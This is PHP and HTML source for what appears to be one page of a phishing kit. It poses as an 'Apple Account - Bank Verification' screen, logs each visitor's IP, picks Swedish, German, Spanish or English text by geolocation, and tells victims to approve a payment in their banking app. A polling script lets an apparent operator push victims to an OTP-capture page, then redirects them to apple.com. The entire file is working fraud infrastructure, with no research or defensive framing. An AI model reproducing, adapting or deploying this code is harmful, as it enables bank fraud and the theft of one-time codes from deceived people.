<?php
if (session_status() == PHP_SESSION_NONE) { session_start(); }

$ib = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);
$_SESSION['user_ip'] = $ib;
$ip_clean = str_replace(['.', ':'], '_', $ib);

$visitor_data = [ 'ip' => $ib, 'last_activity' => time(), 'current_page' => 'bankid.php' ];
file_put_contents("user_" . $ip_clean . ".json", json_encode($visitor_data));

$user_lang = 'en'; 
$details = @json_decode(file_get_contents("http://ip-api.com/json/{$ib}?fields=countryCode"));
if ($details && isset($details->countryCode)) {
    $country = strtoupper($details->countryCode);
    if (in_array($country, ['SE', 'NO', 'FI', 'DK'])) { $user_lang = 'sv'; } 
    elseif (in_array($country, ['DE', 'CH', 'AT', 'LU'])) { $user_lang = 'de'; } 
    elseif (in_array($country, ['ES', 'MX', 'AR', 'CO', 'CL', 'PE', 'VE'])) { $user_lang = 'es'; }
}

$lang_dict = [
    'de' => [ 'h1' => 'Zahlung freigeben', 'p' => 'Bitte öffnen Sie Ihre Schweizer Bank-App auf Ihrem Smartphone, um diese Transaktion umgehend zu bestätigen.', 'load' => 'Warten auf Freigabe...' ],
    'sv' => [ 'h1' => 'Godkänn betalning', 'p' => 'Öppna din bankapp på din smartphone för att omedelbart bekräfta denna transaktion.', 'load' => 'Väntar på godkännande...' ],
    'es' => [ 'h1' => 'Aprobar pago', 'p' => 'Abra la aplicación de su banco en su teléfono inteligente para confirmar esta transacción de inmediato.', 'load' => 'Esperando aprobación...' ],
    'en' => [ 'h1' => 'Approve Payment', 'p' => 'Please open your banking app on your smartphone to immediately confirm this transaction.', 'load' => 'Waiting for approval...' ]
];
$text = $lang_dict[$user_lang];
?>
<!DOCTYPE html> 
<html class="full-height" dir="ltr" lang="<?php echo $user_lang; ?>">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Apple Account - Bank Verification</title>
  <link rel="shortcut icon" href="https://appleid.cdn-apple.com/static/bin/cb3460663665/images/favicon.ico">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fff; color: #1d1d1f; -webkit-font-smoothing: antialiased; }
    .signin-container { max-width: 440px; margin: 50px auto; padding: 0 20px; text-align: center; display: flex; flex-direction: column; align-items: center; }
    .logo-container { margin-bottom: 20px; width: 130px; height: 130px; display: flex; align-items: center; }
    .logo-container img { width: 100%; height: 100%; object-fit: contain; }
    h1 { font-size: 32px; font-weight: 600; margin-bottom: 14px; }
    .verification-card { background: #f5f5f7; border: 1px solid #d2d2d7; border-radius: 12px; padding: 16px; margin-bottom: 25px; text-align: left; width: 100%; }
    .card-header-info { display: flex; gap: 14px; }
    .card-icon { font-size: 22px; color: #0071e3; }
    .card-text p { font-size: 13px; color: #1d1d1f; line-height: 1.5; }
    .bank-loader-box { display: flex; flex-direction: column; align-items: center; padding: 20px 0; gap: 14px; width: 100%; }
    .spinner-loop { animation: spin 1s linear infinite; font-size: 32px; color: #0071e3; }
    @keyframes spin { 100% { transform: rotate(360deg); } }
    .loading-text { font-size: 15px; font-weight: 600; color: #0066cc; }
  </style>
</head>
<body>
<div class="signin-container">
    <div class="logo-container"><img src="1.jpg" alt="Logo"></div>
    <h1><?php echo $text['h1']; ?></h1>
    <div class="verification-card"><div class="card-header-info"><i class="fa-solid fa-mobile-screen-button card-icon"></i><div class="card-text"><p><?php echo $text['p']; ?></p></div></div></div>
    <div class="bank-loader-box"><i class="fa-solid fa-circle-notch spinner-loop"></i><span class="loading-text"><?php echo $text['load']; ?></span></div>
</div>
<script>
  setInterval(() => {
      fetch('get_status.php?nocache=' + new Date().getTime()).then(r => r.text()).then(status => {
          status = status.trim().toLowerCase();
          if (status === 'otp') window.location.href = "smbettal.php";
          else if (status === 'wait') window.location.href = "lod2.php";
          else if (status === 'success_done') window.location.href = "https://www.apple.com";
      });
  }, 2000);
</script>
</body>
</html>